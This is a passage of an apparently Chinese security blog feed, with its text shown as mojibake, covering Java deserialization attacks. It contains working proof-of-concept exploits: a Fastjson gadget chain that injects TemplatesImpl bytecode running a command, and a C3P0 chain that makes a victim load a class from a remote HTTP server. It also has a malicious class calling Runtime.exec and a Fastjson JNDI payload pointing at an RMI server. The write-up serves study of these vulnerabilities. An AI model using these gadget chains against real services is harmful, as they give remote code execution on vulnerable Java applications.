class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        arrayList.add(templatesimpl);</span></span><br><span class="line"><span class="comment">//        JSONArray jsonArray = new JSONArray();</span></span><br><span class="line"><span class="comment">//        jsonArray.add(templatesimpl);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jo.put(<span class="string">&quot;1&quot;</span>,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jo);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line">        setValue(h2,<span class="string">&quot;target&quot;</span>,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xx&quot;</span>));</span><br><span class="line">        HashMap&lt;Object,Object&gt; hhhhashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hhhhashMap.put(templatesimpl,hashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> serial(hhhhashMap);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        deserial(Base64.getDecoder().decode(base64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›ctfé¢˜ç›®"><a href="#ä¸€äº›ctfé¢˜ç›®" class="headerlink" title="ä¸€äº›ctfé¢˜ç›®"></a>ä¸€äº›ctfé¢˜ç›®</h3><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/16540">https://xz.aliyun.com/t/16540</a></p><p><a href="https://xz.aliyun.com/t/16608">https://xz.aliyun.com/t/16608</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C3p0ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>è¿™é‡Œç›´æ¥æ¬è¿ä¸€ä¸‹</p><p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p><p>JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥å£æ¥è®¿é—®ï¼Œè€ŒJDBCæ¥å£åˆ™é€šè¿‡JDBCé©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p0Vul</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;http://127.0.0.1:8889/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">EXP_Loader</span> <span class="variable">exp_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EXP_Loader</span>();</span><br><span class="line">        Pool_Serial(exp_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¶æ„ç±»ä¸€å®šæ³¨æ„ä¸è¦æœ‰åŒ…åä¸ç„¶ä¼šæŠ¥é”™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸‹é¢è®°å½•ä¸€ä¸‹è¿™ä¸ªé“¾çš„è°ƒç”¨è¿‡ç¨‹ã€‚</p><h3 id="æ‰§è¡Œæµç¨‹è¯¦è§£"><a href="#æ‰§è¡Œæµç¨‹è¯¦è§£" class="headerlink" title="æ‰§è¡Œæµç¨‹è¯¦è§£"></a>æ‰§è¡Œæµç¨‹è¯¦è§£</h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ‰¾åˆ°æ¼æ´çš„è§¦å‘ç‚¹æ˜¯åœ¨com&#x2F;mchange&#x2F;v2&#x2F;naming&#x2F;ReferenceableUtils.javaè¿™ä¸ªç±»çš„referentoobjectæ–¹æ³•é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739252255-65084146-295d-419d-8a75-1887fcf2b96f.png"></p><p>å¾ˆæ˜æ˜¾ï¼Œè¯¥æ–¹æ³•æ˜¯ç”¨æ¥è¿›è¡Œç±»åŠ è½½çš„ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ªè¿œç¨‹å·¥å‚ç±»åœ°å€<code>fClassLocation</code>ï¼Œåˆ™ä¼šä½¿ç”¨URLClassLoaderè¿›è¡Œè¿œç¨‹ç±»åŠ è½½ã€‚</p><p>ç„¶åçœ‹ä¸€ä¸‹è°è°ƒç”¨äº†ä»–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739365446-70ca4d16-5018-4556-b08e-bbf66452042b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739324139-afb7ca42-2180-43a2-b10e-11c929942eb6.png"></p><p>å¯ä»¥æ‰¾åˆ°æ˜¯ReferenceableUtilsè¿™ä¸ªç±»çš„getObjectæ–¹æ³•è°ƒç”¨äº†ä»–ï¼Œå†ç»§ç»­æ‰¾ä¸€ä¸‹æ˜¯è°è°ƒç”¨äº†ä»–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739476878-ec11bb2c-2656-45ef-9529-58e5c924f7f2.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯PoolBackedDataSourceBaseçš„readObjectæ–¹æ³•ä¸­ä¼šè¿›è¡Œè°ƒç”¨ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨é“¾å°±å‡ºæ¥äº†ã€‚</p><p>ä¸è¿‡è¿™é‡Œæˆ‘ä»¬è¿˜è¦è¯¦ç»†çœ‹ä¸€ä¸‹ä»–çš„readobjectæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739576691-a4c2214b-4466-44a0-82d9-ba2a9ed6b966.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨è°ƒç”¨ä»–ä¹‹åä¼šå¼ºåˆ¶è½¬æ¢ä¸ºConnectionPoolDataSourceç±»å‹è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739622429-1d6375a3-1f4a-42b2-a34e-df613f4f9795.png"></p><p>æˆ‘ä»¬å‘ç°ä»–å¹¶æ²¡æœ‰å®ç°åºåˆ—åŒ–ï¼Œæ‰€ä»¥ä»–æ˜¯æ²¡æ³•è¢«è¿›è¡Œåºåˆ—åŒ–çš„é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆèƒ½è½¬æˆè¿™ä¸ªå¯¹è±¡å‘¢</p><p>æˆ‘ä»¬åˆ°ä»–çš„writeObejctä¸­çœ‹ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739776286-6d3851cb-3053-48f6-a526-265c5f1bec82.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¦‚æœä¸èƒ½è¿›è¡Œåºåˆ—åŒ–è¿™ä¸ªç±»çš„è¯ä¼šèµ°åˆ°catchæ–¹æ³•é‡Œç”¨<code>ReferenceIndirector.indirectForm(connectionPoolDataSource)</code>å¯¹å…¶è¿›è¡ŒåŒ…è£…æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ª<code>ReferenceSerialized</code>ç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739914284-7c89ef0e-6185-4e19-b222-b5a5bb54fb52.png"></p><p>æ‰€ä»¥<code>ConnectionPoolDataSource</code>ç±»ç»è¿‡åºåˆ—åŒ–åï¼Œå¾—åˆ°çš„æœ€ç»ˆæ˜¯<code>ReferenceSerialized</code>ç±»ï¼Œå› æ­¤åœ¨<code>PoolBackedDataSourceBase#readObject</code>ä¸­è°ƒç”¨çš„å…¶å®æ˜¯<code>ReferenceSerialized#getObject()</code>æ–¹æ³•ã€‚</p><p>è¿™é‡Œä¸€å®šè¦è‡ªå·±è·Ÿä¸€ä¸‹ä»–åºåˆ—åŒ–çš„æµç¨‹å¦åˆ™åé¢çš„pocçœ‹èµ·æ¥å¯èƒ½ä¼šæœ‰ç‚¹ç–‘é—®ã€‚å¯ä»¥çœ‹åˆ°ä»–è°ƒç”¨äº†indirectFormå¯¹connectionPoolDataSourceè¿›è¡Œå°è£…ï¼Œç„¶åè°ƒç”¨äº†getReferenceæ–¹æ³•å°†è·å–å¼•ç”¨å¹¶å®ä¾‹åŒ–è¿›å»ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥æ¶æ„åœ°å€çš„åœ°æ–¹ã€‚è¿™æ¡é“¾å…¶å®ç®—æ˜¯å€Ÿé¸¡ç”Ÿè›‹ï¼Œå°±æ˜¯å€Ÿç€<code>ConnectionPoolDataSource</code>ç±»æ¥ä¸‹çš„<code>ReferenceSerialized</code>ğŸ¥šã€‚</p><p>æ‰€ä»¥åˆ°è¿™å¤§ç›–å°±èƒ½æ˜ç™½pocçš„å†™æ³•äº†</p><p>è®°å½•ä¸‹è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject -&gt;</span><br><span class="line">ReferenceSerialized#getObject -&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject -&gt;</span><br><span class="line">ObjectFactory#getObjectInstance</span><br><span class="line">URLclassLoader ç±»åŠ è½½</span><br></pre></td></tr></table></figure><h2 id="jndiåˆ©ç”¨"><a href="#jndiåˆ©ç”¨" class="headerlink" title="jndiåˆ©ç”¨"></a>jndiåˆ©ç”¨</h2><p>è¿™é‡Œéœ€è¦ä¾èµ–äº fastjson å’Œ jacksonå»åˆ©ç”¨ã€‚å…ˆç»™å‡ºpoc</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,\&quot;jndiName\&quot;: \&quot;rmi://127.0.0.1:1099/e6pbsf\&quot;,\&quot;loginTimeout\&quot;:0&#125;&quot;</span>;        </span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•æµç¨‹"><a href="#è°ƒè¯•æµç¨‹" class="headerlink" title="è°ƒè¯•æµç¨‹"></a>è°ƒè¯•æµç¨‹</h3><p>å…ˆçœ‹è°ƒç”¨çš„è§¦å‘ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746176829-859f9f53-6eed-48a5-8c0c-0321238816c3.png"></p><p>åœ¨com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;JndiRefForwardingDataSource.javaè¿™ä¸ªç±»çš„dereferenceæ–¹æ³•é‡Œå­˜åœ¨jndiæ³¨å…¥çš„æ¼æ´ã€‚æ¥ä¸‹æ¥å¯»æ‰¾åœ¨å“ªè°ƒç”¨äº†dereferenceè¿™ä¸ªæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746266097-036727d5-c545-455b-989b-2adeab7570d7.png"></p><p><img 